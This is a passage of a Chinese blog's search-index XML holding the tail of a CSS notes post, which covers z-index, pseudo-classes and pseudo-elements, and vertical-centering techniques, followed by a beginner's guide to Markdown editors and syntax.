语法：z-index: auto | 默认值：auto 适用于：定位元素。即定义了position为非static的元素 取值： auto： 元素在当前层叠上下文中的层叠级别是0。元素不会创建新的局部层叠上下文，除非它是根元素。 整数： 用整数值来定义堆叠级别。可以为负值。 说明： 检索或设置对象的层叠顺序。 z-index用于确定元素在当前层叠上下文中的层叠级别，并确定该元素是否创建新的局部层叠上下文。 当多个元素层叠在一起时，数字大者将显示在上面。 ==27. 伪类和伪元素的区别==CSS 伪类用于向某些选择器添加特殊的效果。 CSS 伪元素用于将特殊的效果添加到某些选择器。 可以明确两点，第一两者都与选择器相关，第二就是添加一些“特殊”的效果。这里特殊指的是两者描述了其他 css 无法描述的东西。 伪类种类 伪元素种类 ==28. CSS实现垂直居中==123&lt;div class=&quot;parent&quot;&gt; &lt;div class=&quot;children&quot;&gt;&lt;/div&gt;&lt;/div&gt; 果我们要实现 .children 在 .parent 中垂直居中。 通常第一印象会想起给父元素设置相对定位，给子元素设置绝对定位。这样子元素就相对于父元素定位，再通过 top 与 left 各偏移 50% 父元素宽度，使用 margin-* 来修正子元素的位置。 123456789101112.parent &#123; position: relative;&#125;.chilren &#123; width: $width; height: $height; position: absolute; top: 50%; left: 50%; margin-top: -$height/2; margin-left: -$width/2;&#125; 通过这种方式可以使得子元素在父元素中垂直居中。但是这种实现的方式需要知道子元素的宽高，以方便使用 margin-* 来修正之前的位置。 当不知道子元素的宽高时，这种方法就无法实现正真的垂直居中。这个时候就可以使用 transform: translate(-50%, -50%); 来实现子元素自身的偏移。 123456789.parent &#123; position: relative;&#125;.chilren &#123; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);&#125; 那么不使用定位是否能够使元素垂直居中呢？ 这时候我们来想想要使元素水平居中的时候，我们会怎么做？Ok，一般我们都会用 margin: 0 auto;那么我们就可以让 margin-top: 50%, 这样的效果就跟相对定位时的 top: 50% 的效果差不多。接着就可以使用之前使用过的 transform 属性来使得元素向上偏移自身高度的一半，也就是 transform: translateY(-50%);。 这样就可以实现不使用定位来来使得元素垂直居中了。 1234.chilren &#123; margin: 50% auto 0; transform: translateY(-50%);&#125; 除了上面的这些方法之外，还可以使用 Flexbox 布局来实现。 只需要在父元素中使用 display: flex;，然后在子元素上使用 margin: auto; 就可以实现垂直居中了。 123456.parent &#123; display: flex;&#125;.chilren &#123; margin: auto;&#125;]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>经验帖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown入门_0]]></title>
    <url>%2F2018%2F05%2F06%2FMarkdown%E5%85%A5%E9%97%A8-0%2F</url>
    <content type="text"><![CDATA[Markdown——入门指南(补充版)导语： Markdown 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。看到这里请不要被「标记」、「语言」所迷惑，Markdown 的语法十分简单。常用的标记符号也不超过十个，这种相对于更为复杂的 HTML 标记语言来说，Markdown 可谓是十分轻量的，学习成本也不需要太多，且一旦熟悉这种语法规则，会有一劳永逸的效果。 一，认识 Markdown 在刚才的导语里提到，Markdown 是一种用来写作的轻量级「标记语言」，它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages 有大量的排版、字体设置。它使我们专心于码字，用「标记」语法，来代替常见的排版格式。例如此文从内容到格式，甚至插图，键盘就可以通通搞定了。目前来看，支持 Markdown 语法的编辑器有很多，包括很多网站（例如简书）也支持了 Markdown 的文字录入。Markdown 从写作到完成，导出格式随心所欲，你可以导出 HTML 格式的文件用来网站发布，也可以十分方便的导出 PDF 格式，这种格式写出的简历更能得到 HR 的好感。甚至可以利用 CloudApp 这种云服务工具直接上传至网页用来分享你的文章，全球最大的轻博客平台 Tumblr，也支持 Mou 这类 Markdown 工具的直接上传。 Markdown 官方文档这里可以看到官方的 Markdown 语法规则文档，当然，后文我也会用自己的方式阐述这些语法的具体用法。 创始人 John Gruber 的 Markdown 语法说明Markdown 中文版语法说明 使用 Markdown 的优点专注你的文字内容而不是排版样式，安心写作。轻松的导出 HTML、PDF 和本身的 .md 文件。纯文本内容，兼容所有的文本编辑器与字处理软件。随时修改你的文章版本，不必像字处理软件生成若干文件版本导致混乱。可读、直观、学习成本低。 使用 Markdown 的误区We believe that writing is about content, about what you want to say – not about fancy formatting.我们坚信写作写的是内容，所思所想，而不是花样格式。— Ulysses for MacMarkdown 旨在简洁、高效，也由于 Markdown 的易读易写，人们用不同的编程语言实现了多个版本的解析器和生成器，这就导致了目前不同的 Markdown 工具集成了不同的功能（基础功能大致相同），例如流程图与时序图，复杂表格与复杂公式的呈现，虽然功能的丰富并没有什么本质的缺点，但终归有些背离初衷，何况在编写的过程中很费神，不如使用专业的工具撰写来的更有效率，所以如果你需实现复杂功能，专业的图形界面工具会更加方便。当然，如果你对折腾这些不同客户端对 Markdown 的定制所带来高阶功能感到愉悦的话，那也是无可厚非的。 我该用什么工具？Mou for MacMou for Mac在 Mac OS X 上，我强烈建议你用 Mou 这款免费且十分好用的 Markdown 编辑器，它支持实时预览，既左边是你编辑 Markdown 语言，右边会实时的生成预览效果。不仅如此，Mou 还有一些有趣的偏好设置（Preference），例如主题（Themes）与样式（CSS），它们可以配置出定制化的文本编辑效果与导出效果，如果你对自带的主题与样式不满意还可以到 GitHub 上搜索其它爱好者为 Mou 编写的更多主题样式，导入的方式可以在偏好设置的 Themes 或 CSS 选项中 选择 reload。 如果你从事文字工作，我强烈建议你购买 Ulysses for Mac，这款软件入围了苹果 Mac App Store 的 The Best of 2013。它支持更多的写作格式、多文档的支持。Mou，iA writer 这些软件都是基于单文档的管理方式，而 Ulysses 支持 Folder、Filter 的管理，一个 Folder 里面可以创建多个 Sheet，Sheet 之间也可以进行 Combine 处理。 Mac 上一些 Markdown 编辑器Mac 上一些 Markdown 编辑器由于笔者很少接触 Windows，Windows 下的 Markdown 没有过多涉猎，经朋友介绍，有两款还算不错，一款叫做 MarkdownPad ，另一款叫做 MarkPad。 iOS 端很多 app 早已经支持了 Markdown 录入，例如 Drafts，Day One，iA writer 等，另外 Ulysses for iPad 现在已经上架，可以说是 iOS 平台最好的编辑器了。 在 Web端，我强烈推荐简书这款产品，上面有无数热爱文字的人在不停的创造，分享。在 Web 端使用 Markdown 没有比简书更舒服的地方了，同样支持左右两栏的实时预览，字体优雅，简洁。 简书的编辑预览模式简书的编辑预览模式 二，Markdown 语法的简要规则标题是每篇文章都需要也是最常用的格式，在 Markdown 中，如果一段文字被定义为标题，只要在这段文字前加 # 号即可。 一级标题二级标题三级标题以此类推，总共六级标题，建议在井号后加一个空格，这是最标准的 Markdown 语法。补充：除了在前段加上“＃”还可以是在底部加上“＝” 一级标题列表熟悉 HTML 的同学肯定知道有序列表与无序列表的区别，在 Markdown 下，列表的显示只需要在文字前加上 - 或 * 即可变为无序列表，有序列表则直接在文字前加1. 2. 3. 符号要和文字之间加上一个字符的空格。无序列表与有序列表 无序列表： 1 2 3 补充：无序列表出了加上“＊”还可以是“＋”或者“－”无序列表的第二个示例(建议：一个文档中只是用一种无序列表的表示方式） 1 2 3 有序列表： 1 2 3 引用如果你需要引用一小段别处的句子，那么就要用引用的格式。 例如这样只需要在文本前加入 &gt; 这种尖括号（大于号）即可 这里是引用 图片与链接插入链接与插入图片的语法很像，区别在一个 !号 图片为： 链接为：文字 插入图片的地址需要图床，这里推荐围脖图床修复计划 与 CloudApp 的服务，生成URL地址即可。 粗体与斜体Markdown 的粗体和斜体也非常简单，用两个 包含一段文本就是粗体的语法，用一个 包含一段文本就是斜体的语法。 斜体示例：这里是斜体 补充：当然也可以加下划线“_”斜体示例：这里也是斜体 补充：当然从斜体我们也能思考得出加粗的另一种示例加粗示例：这里是加粗加粗示例：这里是加粗 表格表格是我觉得 Markdown 比较累人的地方，例子如下： Tables Are Cool col 3 is right-aligned $1600 col 2 is centered $12 zebra stripes are neat $1 这种语法生成的表格如下： Tables Are Cool col 3 is right-aligned $1600col 2 is centered $12zebra stripes are neat $1 代码框如果你是个程序猿，需要在文章里优雅的引用代码框，在 Markdown下实现也非常简单，只需要用两个 ` 把中间的代码包裹起来。图例： &lt;a href=&quot;www.baidu.com&quot;&gt;article&lt;/a&gt; 使用 tab 键即可缩进。当用到大片的代码的时候需要使用tab加四个空格 示例`&lt;html&gt; &lt;table border=&quot;1&quot; cellpadding=&quot;10&quot;&gt; &lt;tr&gt; &lt;td&gt;row1 cell1&lt;/td&gt; &lt;td&gt;row1 cell2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&amp;nbsp&lt;/td&gt; &lt;td&gt;row2 cell2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;/table&gt; &lt;/html&gt;` 分割线分割线的语法只需要三个 * 号，例如： 到这里，Markdown 的基本语法在日常的使用中基本就没什么大问题了，只要多加练习，配合好用的工具，写起东西来肯定会行云流水。更多的语法规则，其实 Mou 的 Help 文档栗子很好，当你第一次使用 Mou 时，就会显示该文档。可以用来对用的查找和学习。 引用当我写一段话的时候我先在底部标注一下［1］的链接是什么意思的时候，再次撰写的时候就可以直接在需要链接的部分添加［1］即可：演示如下：这是链接百度 这是谷歌]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
</search>
